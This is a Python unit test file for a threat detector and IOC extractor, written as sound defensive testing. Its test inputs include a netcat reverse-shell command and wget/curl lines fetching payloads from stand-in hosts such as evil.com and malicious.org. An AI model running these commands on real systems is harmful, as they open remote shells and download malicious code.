"""Unit tests for threat detector and IOC extractor"""

import pytest
from detection.detector import detect_attack, extract_iocs


def test_detector_word_boundaries():
    # 'sync' should NOT trigger 'nc' rule
    severity, matched, category, mitre, iocs = detect_attack("sync")
    assert "netcat_reverse_shell" not in matched

    # 'nc -e /bin/sh 1.2.3.4 4444' SHOULD trigger netcat_reverse_shell rule
    severity, matched, category, mitre, iocs = detect_attack("nc -e /bin/sh 1.2.3.4 4444")
    assert "netcat_reverse_shell" in matched
    assert severity == "HIGH"
    assert "T1095" in mitre


def test_detector_wget_curl():
    severity, matched, category, mitre, iocs = detect_attack("wget http://evil.com/malware.sh")
    assert "wget_download" in matched
    assert severity == "HIGH"
    assert category == "download_execute"
    assert "T1105" in mitre


def test_ioc_extraction():
    cmd = "wget http://192.168.1.50/payload.sh -O /tmp/x; curl https://malicious.org/bot"
    iocs = extract_iocs(cmd)
    assert "urls" in iocs
    assert "http://192.168.1.50/payload.sh" in iocs["urls"]
    assert "https://malicious.org/bot" in iocs["urls"]
    assert "ips" in iocs
    assert "192.168.1.50" in iocs["ips"]


def test_hash_extraction():
    cmd = "echo e10adc3949ba59abbe56e057f20f883e"
    iocs = extract_iocs(cmd)
    assert "md5" in iocs
    assert "e10adc3949ba59abbe56e057f20f883e" in iocs["md5"]
